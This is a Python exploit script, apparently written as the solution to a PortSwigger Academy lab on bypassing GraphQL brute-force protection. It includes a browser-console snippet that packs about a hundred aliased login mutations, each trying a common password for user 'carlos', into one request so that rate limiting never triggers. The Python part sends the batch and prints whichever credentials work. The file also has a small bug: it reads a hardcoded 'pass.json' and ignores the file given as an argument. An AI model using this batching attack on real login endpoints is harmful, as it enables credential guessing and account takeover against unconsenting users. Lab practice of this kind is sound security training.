#!/usr/bin/python3
#Lab: Bypassing GraphQL brute force protections : https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass

# Description: 
#             Usage : $ python3 LAB-4.py <url> <pass_file>
#             Example: https://xxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net pass_file.json

# To obtain <pass_file> follow the steps mention below or read the TIPS section of this lab:
#             1. Open a browser.
#             2. In a page right-click and select Inspect.
#             3. Select the Console tab.
#             4. Paste the script and press Enter.
#             5. Copy output.
#             6. Save it as pass_file.json in same directory.
'''           Script : """copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");""" '''

import re
from aiohttp import request
import requests
import sys
import json
from requests.exceptions import JSONDecodeError

def greppass(key,pass_file):
    with open(pass_file, encoding="utf-8") as file:
        d = file.read()
        mutation_lines = d.split('\n')

    for line in mutation_lines:
        if key in line:
            match = re.search(r'password: "([^"]+)"', line)
            password = match.group(1) if match else None

            match = re.search(r'username: "([^"]+)"', line)
            username = match.group(1) if match else None
            print("Username : "+username)
            print("Password : "+password)

def req(url ,pass_file):
    json_file_path = "pass.json"
    session = requests.Session()

    with open(json_file_path, "r") as file:
        json_data = { 
        	"query":
        		file.read()
                    }

    headers = {
        'Content-Type': 'application/json'
    }
    vuln_path = url+'/graphql/v1'
    response = requests.post(url=vuln_path, headers=headers, json=json_data)

    if "Please try again in 1 minute(s)" in response.text:
        print("You have made too many incorrect login attempts. Please try again in 1 minute(s)")
    elif "Server Error: Gateway Timeout" in response.text:
        print("Server Error: Gateway Timeout please start a new lab.")
    else:
        response_data = json.loads(response.text)
        data_field = response_data.get('data', {})
        for key, value in data_field.items():
            if value.get('success', False):
                greppass(key, pass_file)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <pass_file>" % sys.argv[0])
        print("(+) Example: %s https://xxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net pass_file.json" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    pass_file = sys.argv[2]
    print("Exploiting...")
    req(url, pass_file)


if __name__=='__main__':
    main()
